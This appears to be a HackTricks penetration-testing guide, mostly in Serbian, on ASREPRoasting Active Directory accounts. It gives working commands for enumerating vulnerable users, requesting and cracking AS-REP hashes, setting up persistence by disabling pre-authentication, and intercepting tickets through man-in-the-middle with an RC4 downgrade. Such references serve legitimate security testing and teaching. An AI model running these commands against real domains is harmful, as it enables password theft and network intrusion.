# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast je bezbednosni napad koji eksploatiše korisnike kojima nedostaje **Kerberos pre-authentication required atribut**. Suštinski, ova ranjivost omogućava napadačima da zatraže autentikaciju za korisnika od Domain Controller (DC) bez potrebe za korisnikovom lozinkom. DC zatim odgovara porukom šifrovanom ključem izvedenim iz korisnikove lozinke, koju napadači mogu pokušati offline da crackuju kako bi otkrili korisnikovu lozinku.

Glavni zahtevi za ovaj napad su:

- **Nedostatak Kerberos pre-authentication**: Ciljni korisnici ne smeju imati omogućen ovu bezbednosnu funkciju.
- **Veza sa Domain Controller (DC)**: Napadačima je potreban pristup DC-u da bi slali zahteve i primali šifrovane poruke.
- **Opcioni domain account**: Imati domain account omogućava napadačima da efikasnije identifikuju ranjive korisnike kroz LDAP upite. Bez takvog naloga, napadači moraju da pogađaju korisnička imena.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Zahtev AS_REP poruke
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus po defaultu zahteva **RC4**, tako da Event ID **4768** obično prikazuje **preauth type 0** i **ticket encryption type 0x17**. Ako dodaš **`/aes`** (ili je RC4 onemogućen za cilj), očekuj **AES etypes** umesto toga.

#### Quick one-liners (Linux)

- Prvo enumeriši potencijalne ciljeve (npr. iz leak-ovanih build paths) pomoću Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roastuj celu listu username-ova bez validnih kredencijala pomoću NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- Ako već imaš kredencijale, pusti NetExec da upita LDAP i zatraži svaki roastable account umesto tebe: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- Ako izlaz počinje sa **`$krb5asrep$23$`**, crackuj ga sa Hashcat **`-m 18200`**. Ako počinje sa **`$krb5asrep$17$`** ili **`$krb5asrep$18$`**, radije koristi John **`--format=krb5asrep`**.

### Cracking

Ne pretpostavljaj da je svaki AS-REP roast RC4. Moderni alati mogu vratiti **RC4** (`$krb5asrep$23$`) ili **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) u zavisnosti od traženog/ugovorenog enctype-a. **`hashcat -m 18200`** je za **etype 23**, dok **John** direktno obrađuje `krb5asrep` za **17/18/23**.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Perzistencija

Prisilite da **preauth** nije potreban za korisnika za kog imate **GenericAll** dozvole (ili dozvole za pisanje svojstava):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast bez kredencijala

Napadač može da koristi man-in-the-middle poziciju da presretne AS-REP pakete dok prolaze kroz mrežu, bez oslanjanja na to da je Kerberos pre-authentication isključena. Zato radi za sve korisnike na VLAN-u.\
Ako želite povezani trik bez kredencijala koji vraća **service ticket** umesto **TGT** od no-preauth principala, pogledajte [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nam omogućava da to uradimo. `relay` režim je interesantan ofanzivno jer može da forsira **RC4** kada klijent i dalje oglašava **etype 23**; `listen` ostaje pasivan i samo hvata ono što su klijent/DC pregovarali.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Reference

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
